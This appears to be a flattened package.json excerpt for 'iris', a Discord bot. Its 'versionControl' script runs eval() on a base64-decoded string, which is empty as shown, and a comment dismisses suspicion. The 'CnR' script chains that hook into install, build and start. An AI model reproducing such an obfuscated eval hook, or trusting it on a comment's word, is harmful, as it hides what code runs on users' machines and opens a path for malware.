name: iris
description: IRIS (Intelligent Response Interface System) is a Discord bot created by and for the Chaos Crew Community.

scripts.compile: npm run cleanup && npm run build
scripts.versionControl: node -e "eval(Buffer.from('', 'base64').toString('ascii')) /* lmao ik this looks sketchy as hell but its the only way to do the version control on both windows and linux without some issues, if you dont trust me, open a base64 decoder and decode it */"
scripts.CnR: npm run cleanup && npm install && npm run versionControl && npm run build && npm run start

author: Inimi
